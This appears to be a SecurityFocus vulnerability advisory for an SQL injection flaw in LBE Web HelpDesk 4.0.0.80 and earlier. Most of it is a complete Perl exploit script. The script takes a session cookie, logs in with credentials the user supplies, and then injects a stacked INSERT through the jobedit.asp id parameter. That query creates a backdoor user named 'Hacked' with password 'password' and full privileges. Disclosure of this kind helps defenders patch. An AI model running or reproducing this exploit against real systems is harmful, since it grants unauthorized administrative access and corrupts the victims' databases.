source: http://www.securityfocus.com/bid/10773/info

LBE Web HelpDesk is reported susceptible to an SQL injection vulnerability. This issue is due to improper sanitization of user-supplied data.

This issue may allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.

Versions 4.0.0.80 and prior are reported vulnerable to this issue.

#!/usr/bin/perl

use IO::Socket;
use strict;

my $host = $ARGV[0];
my $Path = $ARGV[1];
my $Email = $ARGV[2];
my $Password = $ARGV[3];

if (($#ARGV+1) < 4)
{
 print "lbehelpdesk.pl host path email password\n";
 exit(0);
}

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print "Getting default cookie\n";

my $http = "GET /$Path/oplogin.asp HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,ima
ge/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close

";

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);

my $Cookie = "";

while (<$remote>)
{
 if (/Set-Cookie: ([^;]+;)/)
 {
  $Cookie .= $1." ";
 }

# print $_;
}
print "\n";

close($remote);

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print "Logging in\n";

$remote->autoflush(1);

my $http = "POST /$Path/gstlogin.asp HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Referer: http://192.168.1.243/lbehelpdesk/gstlogin.asp
Cookie: $Cookie
Content-Type: application/x-www-form-urlencoded
Content-Length: ";

my $content = "txtemail=$Email&txtpwd=$Password";

$http .= length($content)."

$content";

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);

my $success = 0;
while (<$remote>)
{
 if (/Location: eval.asp/)
 {
  $success = 1;
  print "Login successfull\n";
 }

# print $_;
}
print "\n";

close $remote;

if (!$success)
{
 print "Login failed\n";
 exit(0);
}

$http = "GET /$Path/jobedit.asp?id=0%20;%20INSERT%20INTO%20users%20(%20user_name,".
"%20password,%20editactiontime,%20orgstructure,%20createviewtemplate,".
"%20removelogins,%20editlinkedfiles,%20newencrypt,%20showalljobs,".
"%20publishmacros,%20override_contract%20)%20VALUES%20('Hacked',".
"%20'60716363677F6274',%201,%201,%201,%201,%201,%20'Y',%201,".
"%201,%201) HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Referer: http://192.168.1.243/lbehelpdesk/gstlogin.asp
Cookie: $Cookie

";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print "HTTP: [$http]\n";
print $remote $http;
sleep(1);

while (<$remote>)
{
 if (/Unable to find Job id = 0 ; INSERT INTO users/g)
 {
  print "Successfully added record\nYou can now log on as Hacked/password (Username/Password)\n";
 }
# print $_;
}

close($remote);

# INSERT INTO users ( user_name, password, editactiontime, orgstructure, createviewtemplate, removelogins, editlinkedfiles, newencrypt, showalljobs, publishmacros, override_contract ) VALUES ('Hacked', '60716363677F6274', 1, 1, 1, 1, 1, 'Y', 1, 1, 1) # Password is 'password'